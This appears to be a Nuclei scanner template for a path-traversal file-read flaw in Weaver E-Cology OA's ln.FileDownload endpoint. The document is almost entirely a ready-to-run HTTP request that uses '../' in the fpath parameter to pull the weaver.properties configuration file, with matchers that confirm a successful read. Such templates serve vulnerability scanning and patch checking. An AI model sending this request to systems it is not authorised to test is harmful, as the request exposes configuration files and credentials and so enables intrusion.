id: fanweiOA-E-Cology-FileDownload-fileread

info:
  name: 泛微OA-E-Cology-FileDownload文件读取漏洞
  author: cnaq 
  severity: medium
  description: 泛微OA-E-Cology-FileDownload文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA-E-Cology-FileDownload%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: fanwei,oa,ebridge,lfi


requests:
  - raw:
      - |
        GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: or
        words:
          - 'MAPI=1'
          - 'ecology.url'
